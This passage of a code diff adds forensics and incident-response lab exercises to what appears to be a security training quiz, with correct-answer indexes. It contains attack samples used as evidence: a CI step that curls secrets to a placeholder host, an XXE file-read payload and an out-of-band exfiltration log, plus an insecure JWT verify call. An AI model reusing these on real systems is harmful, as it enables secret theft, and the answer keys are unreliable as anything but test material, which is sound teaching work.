@@ -6291,4 +6291,996 @@ Session cookie exfil destination: cdn-pdfconv.example`,
       },
     ],
   },
+  {
+    id: 'lab-62',
+    title: 'USB Device History in an Exfiltration Case',
+    domain: 1,
+    difficulty: 'Medium',
+    xpReward: 250,
+    briefing: 'A lab technician is accused of copying research data to a USB drive. The suspect says they never plugged anything in. You have a disk image of the workstation LAB-WS03. Use Windows artifacts to determine which removable devices were connected and what was accessed.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Enumerate devices',
+        evidence: r`Registry: SYSTEM\CurrentControlSet\Enum\USBSTOR
+Disk&Ven_SanDisk&Prod_Ultra_Fit&Rev_1.00\4C530001230918115173&0
+  FriendlyName: SanDisk Ultra Fit USB Device
+Disk&Ven_Kingston&Prod_DataTraveler&Rev_PMAP\0019E06B9C4AF1A0&0
+  FriendlyName: Kingston DataTraveler 3.0`,
+        question: 'What do these keys show?',
+        options: [
+          'Two USB mass storage devices with their vendor, product, and unique serial numbers have been connected to the system',
+          'Two printers were installed',
+          'The devices are still connected',
+          'The registry was wiped',
+        ],
+        correctIndex: 0,
+        hint: 'USBSTOR records storage devices.',
+        walkthrough: 'USBSTOR lists every USB storage device class that Windows has seen, keyed by vendor, product, revision, and serial number. Serials let you tie a physical drive found later to this computer.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Establish first and last connection',
+        evidence: r`setupapi.dev.log
+>>>  [Device Install (Hardware initiated) - USBSTOR\Disk&Ven_SanDisk&Prod_Ultra_Fit\4C530001230918115173&0]
+>>>  Section start 2026-09-30 16:41:12
+USBSTOR\...\4C530001230918115173&0\Properties {83da6326-97a6-4088-9453-a1923f573b29}
+  0066 (Last arrival): 2026-10-03 17:55:08
+  0067 (Last removal): 2026-10-03 18:20:41`,
+        question: 'What timeline do these artifacts give for the SanDisk drive?',
+        options: [
+          'Removed on 09-30',
+          'Connected only once on 10-03',
+          'Never connected',
+          'First installed on 09-30 at 16:41 and last connected on 10-03 from 17:55 to 18:20',
+        ],
+        correctIndex: 3,
+        hint: 'setupapi gives first install; device properties give last arrival and removal.',
+        walkthrough: 'setupapi.dev.log records the first time a device was installed. The device property keys record last arrival and removal times. Together they bracket usage windows.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Link the device to a user and drive letter',
+        evidence: r`SYSTEM\MountedDevices:  \DosDevices\E:  -> ...4C530001230918115173...
+NTUSER.DAT (user t.nguyen)\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2\{9a1f...}
+  Volume GUID matches SanDisk volume`,
+        question: 'Why is MountPoints2 important here?',
+        options: [
+          'It shows who manufactured the drive',
+          'It is in t.nguyen\'s own registry hive, showing the drive was mounted while that user was logged on',
+          'It proves files were copied',
+          'It belongs to the SYSTEM account',
+        ],
+        correctIndex: 1,
+        hint: 'Which hive is it in?',
+        walkthrough: 'MountedDevices maps the volume to drive E:. MountPoints2 in the user\'s NTUSER.DAT ties the volume to that user\'s session, which addresses the claim that the user never connected a device.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Show file access',
+        evidence: r`LNK files (t.nguyen\AppData\Roaming\Microsoft\Windows\Recent)
+Assay_Results_Q3.xlsx.lnk  Target: E:\export\Assay_Results_Q3.xlsx  VolumeSerial: 6A2C-11F0  Created: 2026-10-03 18:02
+ShellBags: E:\export  last interacted 2026-10-03 18:03`,
+        question: 'What does this establish?',
+        options: [
+          'The file was emailed',
+          'The file was printed',
+          r`During the 10-03 connection window, the user opened a research file located on E: and browsed the E:\export folder`,
+          'The LNK file proves deletion',
+        ],
+        correctIndex: 2,
+        hint: 'LNK files store the target path and volume serial.',
+        walkthrough: 'LNK and ShellBags show interaction with files and folders on the USB volume. The volume serial ties them to the specific drive. It shows access on the drive, and combined with source file access times it supports copying.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'State the conclusion',
+        evidence: r`Corroboration
+Source share \\RSRCH-FS\Assays: 4663 read events by t.nguyen 2026-10-03 17:57-18:01 (212 files)`,
+        question: 'Which conclusion is best supported?',
+        options: [
+          't.nguyen sold the data',
+          r`A SanDisk drive (serial 4C53...5173) was connected under t.nguyen's session on 10-03 from 17:55 to 18:20, during which 212 research files were read from the share and files were opened from E:\export`,
+          'No device was connected',
+          'The data was copied to the cloud',
+        ],
+        correctIndex: 1,
+        hint: 'Combine host and server evidence; leave motive aside.',
+        walkthrough: 'Registry, setupapi, LNK, ShellBags, and file server audit logs line up. The report should state these facts and leave conclusions about intent and policy violation to HR and legal.',
+      },
+    ],
+  },
+  {
+    id: 'lab-63',
+    title: 'Recovering Deleted Files with the MFT and UsnJrnl',
+    domain: 1,
+    difficulty: 'Hard',
+    xpReward: 250,
+    briefing: 'An attacker deleted their tools from a compromised web server before leaving. The SOC needs to know which files existed, when they were created and deleted, and whether any can be recovered. You have a raw image of the NTFS volume.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Parse the change journal',
+        evidence: r`MFTECmd.exe -f $J --csv out
+UpdateTimestamp       Name            UpdateReasons                       EntryNumber
+2026-10-28 22:10:03   rclone.exe      FileCreate                          88412
+2026-10-28 22:10:04   rclone.conf     FileCreate                          88413
+2026-10-29 03:41:50   rclone.exe      FileDelete|Close                    88412
+2026-10-29 03:41:50   rclone.conf     FileDelete|Close                    88413`,
+        question: 'What does the UsnJrnl tell you even if the files are gone?',
+        options: [
+          'Nothing, deleted files are not journaled',
+          'The full file contents',
+          'Which user typed the commands',
+          'The names, creation times, and deletion times of the files, which shows a data transfer tool was present for about five and a half hours',
+        ],
+        correctIndex: 3,
+        hint: 'The journal records changes, not content.',
+        walkthrough: '$UsnJrnl:$J logs file system changes with reasons. It survives deletion of the files themselves and often covers days or weeks. rclone suggests cloud exfiltration.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Check the MFT record',
+        evidence: r`MFTECmd.exe -f $MFT --csv out (entry 88412)
+InUse: False   FileName: rclone.exe   ParentPath: .\inetpub\temp
+SI Created: 2026-10-28 22:10:03   FN Created: 2026-10-28 22:10:03
+Data: non-resident, run list intact`,
+        question: 'Why does "non-resident, run list intact" matter?',
+        options: [
+          'The MFT still points to the clusters where the file content was stored, so if they have not been overwritten the file can be carved back',
+          'It means the file is encrypted',
+          'It means the file is still in use',
+          'It means the file was never written',
+        ],
+        correctIndex: 0,
+        hint: 'Where does the data of a non-resident file live?',
+        walkthrough: 'When a file is deleted, NTFS marks the record unused but often leaves the run list. If the clusters are not yet reused, tools can recover the content.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Recover the config',
+        evidence: r`icat -o 2048 image.raw 88413 > rclone.conf.recovered
+$ cat rclone.conf.recovered
+[remote]
+type = s3
+provider = Other
+endpoint = https://s3.storage-provider.example
+access_key_id = (redacted for report)`,
+        question: 'What is the value of recovering this file?',
+        options: [
+          'It reveals the exfiltration destination and an account the provider can be asked to suspend and preserve',
+          'It decrypts the stolen data',
+          'It proves who the attacker is',
+          'It allows you to restart the attack',
+        ],
+        correctIndex: 0,
+        hint: 'Who can act on an endpoint and account?',
+        walkthrough: 'The recovered config names the storage endpoint and the attacker\'s access identity. Legal can request that the provider preserve and disable it, and the endpoint becomes an IOC for network logs.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Detect timestomping',
+        evidence: r`MFT entry 90155 webhelper.dll
+SI Created: 2019-06-11 08:00:00
+FN Created: 2026-10-28 22:12:47`,
+        question: 'What does the mismatch between $SI and $FN times suggest?',
+        options: [
+          'The file is from 2019',
+          'The file\'s standard information timestamp was backdated to blend in, while the filename attribute kept the real creation time',
+          'The disk clock is broken',
+          'It is normal for DLLs',
+        ],
+        correctIndex: 1,
+        hint: 'Which timestamp is harder to change from user mode?',
+        walkthrough: 'Most timestomping tools change $STANDARD_INFORMATION. $FILE_NAME times are updated by the kernel and rarely altered. An $SI time years before $FN is a strong sign of tampering.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Report',
+        evidence: r`Summary table
+rclone.exe   created 10-28 22:10, deleted 10-29 03:41, recovered: yes
+rclone.conf  created 10-28 22:10, deleted 10-29 03:41, recovered: yes
+webhelper.dll timestomped, created 10-28 22:12`,
+        question: 'What should the network team do with this timeline?',
+        options: [
+          'Restore the server from yesterday\'s backup and close the case',
+          'Nothing, disk evidence is enough',
+          'Block all S3 traffic forever',
+          'Search firewall and proxy logs for connections to the S3 endpoint between 22:10 and 03:41 to estimate how much data left',
+        ],
+        correctIndex: 3,
+        hint: 'Disk artifacts give the window; network logs give volume.',
+        walkthrough: 'The file system timeline bounds the exfiltration window. Network logs with byte counts to the endpoint quantify the loss, which matters for breach notification.',
+      },
+    ],
+  },
+  {
+    id: 'lab-64',
+    title: 'Detecting DNS Reconnaissance and Zone Transfers',
+    domain: 2,
+    difficulty: 'Easy',
+    xpReward: 250,
+    briefing: 'The external DNS provider sent a report of many AXFR requests against your domain, and the internal DNS server logged a burst of queries for hostnames that do not exist. Determine what an attacker learned and lock down DNS.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Read the external log',
+        evidence: r`named query log (ns1.corp.example)
+29-Oct-2026 11:02:14 client 203.0.113.18#53211: query: corp.example IN AXFR -T
+29-Oct-2026 11:02:14 client 203.0.113.18#53211: transfer of 'corp.example/IN': AXFR started
+29-Oct-2026 11:02:14 client 203.0.113.18#53211: transfer of 'corp.example/IN': AXFR ended`,
+        question: 'What happened?',
+        options: [
+          'An external host completed a full zone transfer, receiving every DNS record in the zone',
+          'The request was blocked',
+          'A normal recursive query',
+          'A DNS cache poisoning attack',
+        ],
+        correctIndex: 0,
+        hint: 'AXFR started and ended without an error.',
+        walkthrough: 'A zone transfer returns the entire zone. If it is allowed to any client, attackers get a list of hostnames, including staging, VPN, and admin systems.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Review the leaked records',
+        evidence: r`dev-jenkins.corp.example.    A   198.51.100.21
+vpn-old.corp.example.         A   198.51.100.33
+hr-payroll-test.corp.example. A   198.51.100.40
+_ldap._tcp.corp.example.      SRV 0 100 389 dc1.corp.example.`,
+        question: 'Why is this exposure a concern?',
+        options: [
+          'DNS records are secret keys',
+          'It reveals forgotten or sensitive systems that may be less protected, such as an old VPN and a test payroll server',
+          'It exposes all passwords',
+          'It has no impact',
+        ],
+        correctIndex: 1,
+        hint: 'Which systems are likely forgotten?',
+        walkthrough: 'Names like dev, old, and test often point to unpatched or weakly protected systems. Attackers prioritize them. Check each for exposure and whether it should exist at all.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Spot brute-force enumeration',
+        evidence: r`Internal resolver log (10.10.0.53), 5 minutes
+Source 10.10.44.9 queries: 8,210  NXDOMAIN: 8,021
+Sample: admin.corp.example, backup.corp.example, git.corp.example, jira.corp.example ...`,
+        question: 'What does a high NXDOMAIN ratio from one internal host indicate?',
+        options: [
+          'A DHCP problem',
+          'A normal user browsing',
+          'A broken DNS server',
+          'A wordlist-based subdomain brute force from a host inside the network',
+        ],
+        correctIndex: 3,
+        hint: 'Most of the guesses fail.',
+        walkthrough: 'Thousands of queries for common names with mostly NXDOMAIN answers is dictionary enumeration. Coming from an internal host, it suggests a compromised machine or an unauthorized scan.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Respond',
+        evidence: r`10.10.44.9 = MKT-WS12, user r.ito
+EDR: python.exe running dnsenum-like script from Downloads, started 10:58`,
+        question: 'What is the appropriate action?',
+        options: [
+          'Shut down the internal DNS server',
+          'Ignore internal DNS activity',
+          'Isolate the workstation and investigate how the script got there, while checking for other reconnaissance from the same host',
+          'Reset every user\'s password',
+        ],
+        correctIndex: 2,
+        hint: 'Reconnaissance usually precedes other actions.',
+        walkthrough: 'Internal reconnaissance often follows initial access. Isolate, collect evidence, and check for further activity like port scans or authentication attempts.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Fix the configuration',
+        evidence: r`named.conf
+zone "corp.example" {
+    type master;
+    file "corp.example.db";
+    allow-transfer { any; };
+};`,
+        question: 'What change prevents unauthorized zone transfers?',
+        options: [
+          'Delete the zone',
+          'Set allow-transfer to only the secondary name servers\' IPs, ideally with TSIG keys',
+          'Change the port to 5353',
+          'Set allow-query to none',
+        ],
+        correctIndex: 1,
+        hint: 'Restrict who can transfer, not who can query.',
+        walkthrough: 'Only secondaries need AXFR. Limiting it by IP and requiring TSIG signatures prevents enumeration. Also consider split-horizon DNS so internal names never appear in the public zone.',
+      },
+    ],
+  },
+  {
+    id: 'lab-65',
+    title: 'Rogue DHCP Server on the Guest Network',
+    domain: 2,
+    difficulty: 'Medium',
+    xpReward: 250,
+    briefing: 'Guests and some employees on the shared wireless network report being redirected to a login page asking for their company credentials. The network team sees DNS settings that do not match the official configuration. Find the source and stop it.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Check a client lease',
+        evidence: r`C:\> ipconfig /all
+   DHCP Server . . . . . . . . . . : 10.90.0.66
+   Default Gateway . . . . . . . . : 10.90.0.66
+   DNS Servers . . . . . . . . . . : 10.90.0.66
+Official DHCP server: 10.90.0.1`,
+        question: 'What does this indicate?',
+        options: [
+          'The official DHCP server changed its IP',
+          'A rogue DHCP server is giving clients its own address as gateway and DNS server, placing it in the middle of their traffic',
+          'The client is using a static IP',
+          'DNS is offline',
+        ],
+        correctIndex: 1,
+        hint: 'Compare the DHCP server address to the official one.',
+        walkthrough: 'Whoever answers DHCP first can set gateway and DNS. A rogue server sets itself, so it can redirect names to phishing pages and intercept traffic.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Capture DHCP traffic',
+        evidence: r`tcpdump -nn -v port 67 or port 68
+DHCP-Offer from 10.90.0.1  (MAC 00:1b:21:aa:00:01)  yiaddr 10.90.3.120
+DHCP-Offer from 10.90.0.66 (MAC 3c:22:fb:12:9e:07)  yiaddr 10.90.9.15  (arrives 4 ms earlier)`,
+        question: 'Why do some clients accept the rogue offer?',
+        options: [
+          'Clients choose randomly every time',
+          'The rogue server has a higher priority flag',
+          'Clients usually take the first offer they receive, and the rogue server responds faster',
+          'The official server is disabled',
+        ],
+        correctIndex: 2,
+        hint: 'DHCP has no built-in authentication.',
+        walkthrough: 'DHCP clients accept the first suitable offer. A rogue server on the same broadcast domain can win the race, especially if it is close to the clients.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Assess the DNS manipulation',
+        evidence: r`Query to 10.90.0.66: login.microsoftonline.com -> 10.90.0.66
+Query to 10.90.0.66: www.google.com -> 142.250.x.x (correct)`,
+        question: 'What is the attacker\'s goal?',
+        options: [
+          'Mining cryptocurrency',
+          'Blocking all internet access',
+          'Speeding up DNS',
+          'Selectively redirecting a sign-in domain to a fake page to harvest credentials while leaving other sites normal',
+        ],
+        correctIndex: 3,
+        hint: 'Only one name is wrong.',
+        walkthrough: 'Selective DNS redirection lowers suspicion. Users see a login page on a familiar name. TLS warnings would appear unless users ignore them or a captive-portal look tricks them.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Locate and remove',
+        evidence: r`wlc# show client detail 3c:22:fb:12:9e:07
+AP Name: AP-LOBBY-02   SSID: Corp-Guest   Connected: 2h 14m
+User: (open SSID)`,
+        question: 'What is the best way to stop the active attack?',
+        options: [
+          'Turn off DHCP entirely',
+          'Reboot all access points',
+          'Block the MAC on the wireless controller, locate the device near AP-LOBBY-02, and enable DHCP snooping or rogue DHCP protection',
+          'Tell users to set static IPs',
+        ],
+        correctIndex: 2,
+        hint: 'The controller knows where the client is.',
+        walkthrough: 'Blocking the client stops it immediately. The AP name narrows the physical location. Permanent fixes stop rogue DHCP replies from untrusted ports or wireless clients.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Handle exposed users',
+        evidence: r`Fake page logs unavailable. Proxy shows clients using rogue DNS: 47.
+Of those, Entra sign-ins from unusual IPs in the last 24h: 5`,
+        question: 'How should the five users be handled?',
+        options: [
+          'Only notify them',
+          'Ignore them since it was the guest network',
+          'Reset their passwords, revoke sessions, and review their accounts, since their credentials were likely captured',
+          'Block their laptops from Wi-Fi',
+        ],
+        correctIndex: 2,
+        hint: 'Unusual sign-ins after exposure are a bad sign.',
+        walkthrough: 'Credentials typed into the fake page may be in use. Treat those accounts as compromised. Remind staff not to use the guest network for corporate sign-ins and push phishing-resistant MFA.',
+      },
+    ],
+  },
+  {
+    id: 'lab-66',
+    title: 'AWS Root Account Compromise',
+    domain: 3,
+    difficulty: 'Hard',
+    xpReward: 250,
+    briefing: 'GuardDuty alerted on root account console sign-in from an unusual country for a production AWS account. The root account was supposed to be locked away. Investigate what the attacker did and recover control.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Confirm the root activity',
+        evidence: r`CloudTrail
+eventName: ConsoleLogin  userIdentity.type: Root  sourceIPAddress: 203.0.113.140
+additionalEventData: {"MFAUsed":"No"}  responseElements: {"ConsoleLogin":"Success"}
+eventTime: 2026-11-02T04:12:09Z`,
+        question: 'What is the most critical observation?',
+        options: [
+          'The login came from an IAM user',
+          'The login failed',
+          'The root user logged in without MFA, which means only the password was needed',
+          'The event is from the billing service',
+        ],
+        correctIndex: 2,
+        hint: 'Look at MFAUsed.',
+        walkthrough: 'Root has unrestricted access in the account. A root login with no MFA from an unknown IP means the password was compromised and MFA was not enforced. It is the highest severity AWS identity event.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Review subsequent actions',
+        evidence: r`04:14  CreateAccessKey (Root)
+04:16  CreateUser  userName: support-ops
+04:16  AttachUserPolicy  AdministratorAccess  -> support-ops
+04:20  RunInstances  type: p4d.24xlarge  count: 20  region: ap-south-1
+04:22  PutBucketPolicy  bucket: prod-customer-data`,
+        question: 'Which actions are attempts to keep access?',
+        options: [
+          'The console login',
+          'Running instances',
+          'Creating root access keys and a new admin user',
+          'Changing a bucket policy',
+        ],
+        correctIndex: 2,
+        hint: 'Persistence means ways back in.',
+        walkthrough: 'Root access keys and a new admin user survive a password change. The large GPU instances suggest cryptomining. The bucket policy change may expose data and must be reviewed.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Recover control',
+        evidence: r`Recovery plan
+1. Reset root password via the account email (verify mailbox is not compromised)
+2. Enable hardware MFA on root
+3. Delete root access keys
+4. Delete IAM user support-ops and its keys
+5. Revert bucket policy`,
+        question: 'Why check the mailbox before resetting the root password?',
+        options: [
+          'To read the GuardDuty alert',
+          'AWS requires it',
+          'If the attacker controls the account\'s root email, they can reset the password again and retake the account',
+          'The mailbox stores CloudTrail logs',
+        ],
+        correctIndex: 2,
+        hint: 'How is the root password recovered?',
+        walkthrough: 'Root password reset goes through the account email. If that mailbox is compromised, likely how the root password was obtained, the attacker can repeat the reset. Secure the mailbox first.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Assess data exposure',
+        evidence: r`prod-customer-data bucket policy (04:22): Principal "*" allowed s3:GetObject
+CloudTrail data events: GetObject from 203.0.113.140: 18,440 objects 04:23-05:10
+Policy reverted at 05:11`,
+        question: 'What does this mean for the incident?',
+        options: [
+          'The attacker downloaded a large number of customer objects, so this is a data breach requiring notification analysis',
+          'No data was accessed',
+          'Only metadata was exposed',
+          'The objects were encrypted so there is no risk',
+        ],
+        correctIndex: 0,
+        hint: 'Data events show actual reads.',
+        walkthrough: 'The attacker opened the bucket and pulled thousands of objects. With S3-managed encryption, reads by an authorized policy return plaintext. Treat it as a breach.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Prevent recurrence',
+        evidence: r`Org-level controls proposed
+- Root MFA (hardware key) on every account; root email on a protected shared mailbox
+- SCP: deny all actions for root except in break-glass process
+- Alert on any root sign-in
+- Service quotas and budget alerts per region`,
+        question: 'What does an SCP denying root actions achieve in member accounts?',
+        options: [
+          'Even if root credentials are stolen, the root user cannot perform actions in member accounts governed by the policy',
+          'It deletes the root user',
+          'It enables MFA automatically',
+          'It blocks all users',
+        ],
+        correctIndex: 0,
+        hint: 'SCPs apply to every principal in member accounts, including root.',
+        walkthrough: 'In AWS Organizations, SCPs restrict root in member accounts. With centralized root access management, member accounts may not need root credentials at all. Alerts and budgets catch abuse quickly.',
+      },
+    ],
+  },
+  {
+    id: 'lab-67',
+    title: 'Leaked GitHub Token Used Against Private Repos',
+    domain: 3,
+    difficulty: 'Medium',
+    xpReward: 250,
+    briefing: 'GitHub\'s secret scanning notified you that a personal access token belonging to a developer appeared in a public gist. Audit logs show clone activity from an unfamiliar IP. Determine the scope and contain.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Review the alert',
+        evidence: r`Secret scanning alert
+Type: GitHub personal access token (classic)
+Owner: dev-mlopez
+Scopes: repo, read:org, workflow
+Location: public gist "debug notes" created 2026-11-04 09:12
+Token last used: 2026-11-04 13:40 from 198.51.100.200`,
+        question: 'Why is the workflow scope especially dangerous?',
+        options: [
+          'It is a harmless default',
+          'It only lets the user read workflow logs',
+          'It allows modifying GitHub Actions workflows, which can expose repository secrets and run code in CI',
+          'It allows deleting the organization',
+        ],
+        correctIndex: 2,
+        hint: 'What do workflows have access to?',
+        walkthrough: 'Workflow scope lets the token push changes to .github/workflows. An attacker can add a job that prints or sends repository secrets, or tamper with build output.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Check the audit log',
+        evidence: r`Org audit log (actor: dev-mlopez, IP 198.51.100.200)
+13:40 git.clone  repo: corp/payments-api
+13:41 git.clone  repo: corp/infra-terraform
+13:43 git.clone  repo: corp/mobile-app
+13:52 git.push   repo: corp/infra-terraform  branch: ci-fix  files: .github/workflows/plan.yml`,
+        question: 'What is the most concerning event?',
+        options: [
+          'Nothing, the developer works on these repos',
+          'The first clone',
+          'Cloning the mobile app',
+          'A push that modified a workflow file in the infrastructure repo',
+        ],
+        correctIndex: 3,
+        hint: 'Which action changes something?',
+        walkthrough: 'Clones expose source code. A workflow push can run attacker-controlled code with the repo\'s secrets, possibly including cloud deploy credentials.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Inspect the workflow change',
+        evidence: r`.github/workflows/plan.yml (branch ci-fix)
++ - run: env | base64 -w0 | curl -s -X POST --data-binary @- https://hooks.collector.example/x
+Workflow run #811 on ci-fix: completed 13:53  secrets in env: AWS_DEPLOY_ROLE_KEY, TF_API_TOKEN`,
+        question: 'What must be assumed?',
+        options: [
+          'Secrets are masked in logs so they are safe',
+          'The secrets available to that workflow run were sent to the attacker, so they must all be rotated',
+          'Only the branch is affected',
+          'The run failed so nothing happened',
+        ],
+        correctIndex: 1,
+        hint: 'Masking hides secrets in logs, not in outbound requests.',
+        walkthrough: 'Masking only redacts secrets in log output. The step sent the environment to an external server, so every secret present in that job is exposed.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Contain',
+        evidence: r`Actions
+- Revoke the PAT
+- Rotate AWS_DEPLOY_ROLE_KEY, TF_API_TOKEN
+- Delete branch ci-fix (after preserving it)
+- Review CloudTrail for use of the deploy key since 13:53`,
+        question: 'Why review CloudTrail after rotating the AWS key?',
+        options: [
+          'The attacker may have already used the key to create persistence or access data before rotation',
+          'Rotation fails without a review',
+          'CloudTrail stores the PAT',
+          'To check billing',
+        ],
+        correctIndex: 0,
+        hint: 'Rotation does not undo what was done with the key.',
+        walkthrough: 'Revocation stops future use, but anything the attacker did in AWS with the key between 13:53 and rotation needs to be found and undone.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Prevent recurrence',
+        evidence: r`Controls
+- Enforce fine-grained PATs with expiry and repo scoping; require SSO authorization
+- Branch protection + required review for .github/workflows changes (CODEOWNERS)
+- Use OIDC federation to AWS instead of long-lived keys in secrets
+- Enable push protection for secret scanning`,
+        question: 'How does OIDC federation reduce the impact of a similar attack?',
+        options: [
+          'OIDC encrypts the source code',
+          'Workflows get short-lived credentials scoped by repository and branch conditions, so there is no long-lived key to steal and an untrusted branch can be denied',
+          'OIDC disables Actions',
+          'OIDC makes PATs unnecessary for developers',
+        ],
+        correctIndex: 1,
+        hint: 'Short-lived, conditional credentials.',
+        walkthrough: 'With OIDC, AWS trusts tokens issued for specific repos and refs. A trust policy can allow only the main branch, so a pushed attack branch cannot assume the role. Push protection stops tokens from being committed in the first place.',
+      },
+    ],
+  },
+  {
+    id: 'lab-68',
+    title: 'JWT Algorithm Confusion in an API Gateway',
+    domain: 4,
+    difficulty: 'Hard',
+    xpReward: 250,
+    briefing: 'A penetration tester accessed another tenant\'s data through your SaaS API. They report that they "signed their own admin token." Logs show tokens that pass validation but were never issued by the auth service. Investigate the JWT handling.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Decode the token',
+        evidence: r`Header:  {"alg":"HS256","typ":"JWT","kid":"auth-2026"}
+Payload: {"sub":"pentest-user","tenant":"t-9001","role":"admin","exp":1793520000}
+Issued tokens from auth service use: {"alg":"RS256","kid":"auth-2026"}`,
+        question: 'What is different about the forged token?',
+        options: [
+          'It has no subject',
+          'It has no expiry',
+          'It uses a different kid',
+          'It uses HS256 instead of the expected RS256',
+        ],
+        correctIndex: 3,
+        hint: 'Compare the alg values.',
+        walkthrough: 'RS256 tokens are signed with a private key and verified with a public key. The forged token claims HS256, a symmetric algorithm using a shared secret.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Find the verification flaw',
+        evidence: r`gateway/verify.js
+const key = jwks.getKey(header.kid);   // returns PEM public key
+jwt.verify(token, key);                 // algorithms option not set`,
+        question: 'Why does this allow forgery?',
+        options: [
+          'The kid is predictable',
+          'The public key is too short',
+          'The library trusts the alg in the header, so with HS256 it uses the public key text as the HMAC secret, and anyone can compute that signature since the public key is public',
+          'The token is not base64 encoded',
+        ],
+        correctIndex: 2,
+        hint: 'What secret does HMAC use when it is given a public key?',
+        walkthrough: 'Algorithm confusion occurs when the verifier lets the token choose its algorithm. A public key, readable by anyone, becomes the HMAC secret. Attackers sign arbitrary claims with it.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Scope abuse',
+        evidence: r`Gateway logs: tokens with alg=HS256 accepted, last 90 days
+Count: 3 distinct sub values
+- pentest-user (authorized test)
+- svc-import (none issued by auth service)
+- a.reyes (none issued by auth service)`,
+        question: 'What should you conclude?',
+        options: [
+          'Only the tester used it',
+          'Besides the tester, two other identities used forged tokens and must be investigated as possible real attacks',
+          'All three were legitimate',
+          'The logs are wrong',
+        ],
+        correctIndex: 1,
+        hint: 'Were the other two authorized tests?',
+        walkthrough: 'Searching for the forged token signature (HS256) across history finds every abuse. Unknown uses outside the test window point to real exploitation. Review what those tokens accessed.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Fix verification',
+        evidence: r`Proposed fix
+jwt.verify(token, key, { algorithms: ['RS256'], issuer: 'https://auth.corp.example', audience: 'api' });`,
+        question: 'Why include issuer and audience checks too?',
+        options: [
+          'They are required for HS256',
+          'They speed up verification',
+          'They replace the signature',
+          'They ensure tokens come from your auth service and are meant for this API, preventing reuse of tokens issued for other services',
+        ],
+        correctIndex: 3,
+        hint: 'A valid signature is not the only check.',
+        walkthrough: 'Pinning the algorithm closes the confusion bug. Validating iss and aud stops tokens from another system, even one with a valid signature, from being accepted.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Verify tenant isolation',
+        evidence: 'Payload claim "tenant" is used directly to select database: db = pools[claims.tenant]',
+        question: 'What additional defense would limit damage from any future token flaw?',
+        options: [
+          'Shorten the token to 5 minutes only',
+          'Encrypt the tenant claim',
+          'Rename the claim',
+          'Check that the user exists in that tenant and enforce row-level tenant isolation in the data layer, rather than trusting the claim alone',
+        ],
+        correctIndex: 3,
+        hint: 'Defense in depth across layers.',
+        walkthrough: 'If a token flaw recurs, server-side checks that the subject belongs to the tenant and database-level isolation limit cross-tenant access. Short lifetimes help but do not prevent forgery.',
+      },
+    ],
+  },
+  {
+    id: 'lab-69',
+    title: 'XXE in a Document Upload Feature',
+    domain: 4,
+    difficulty: 'Medium',
+    xpReward: 250,
+    briefing: 'An insurance portal lets brokers upload claim forms as XML. A WAF in monitoring mode recorded unusual DOCTYPE content, and the app server made outbound requests to an unknown host. Investigate whether files were read.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Read the upload',
+        evidence: r`POST /claims/upload  Content-Type: application/xml
+<?xml version="1.0"?>
+<!DOCTYPE claim [ <!ENTITY ext SYSTEM "file:///etc/app/config.properties"> ]>
+<claim><notes>&ext;</notes></claim>`,
+        question: 'What is this upload trying to do?',
+        options: [
+          'Define an external entity that reads a local file and inserts its contents into the notes field',
+          'Upload a large image',
+          'Run SQL',
+          'Create a new user',
+        ],
+        correctIndex: 0,
+        hint: 'SYSTEM entities can reference files and URLs.',
+        walkthrough: 'XML External Entity injection uses DTD entities pointing to file or network resources. If the parser resolves them, file contents appear where the entity is referenced.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Check the response',
+        evidence: r`HTTP/1.1 200 OK
+{"status":"accepted","preview":{"notes":"db.url=jdbc:postgresql://claims-db:5432/claims\ndb.user=claims_app\ndb.password=..."}}`,
+        question: 'What has happened?',
+        options: [
+          'The upload was rejected',
+          'The server resolved the entity and returned the configuration file, including database credentials',
+          'Only the file name was exposed',
+          'The WAF blocked it',
+        ],
+        correctIndex: 1,
+        hint: 'Look at the preview field.',
+        walkthrough: 'The application echoes the notes field, so the file content came straight back. The database credentials must now be considered compromised.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Interpret outbound traffic',
+        evidence: r`Firewall log (app server)
+10:44:12 claims-app01 -> 203.0.113.70:80  GET /x.dtd
+10:44:12 claims-app01 -> 203.0.113.70:80  GET /?d=cm9vdDp4OjA6MDpyb290...`,
+        question: 'What technique does this show?',
+        options: [
+          'An SMB relay',
+          'Normal update checks',
+          'DNS tunneling',
+          'Out-of-band XXE, where a remote DTD makes the server send file contents to the attacker in a URL',
+        ],
+        correctIndex: 3,
+        hint: 'The server fetched a DTD and then sent base64 data out.',
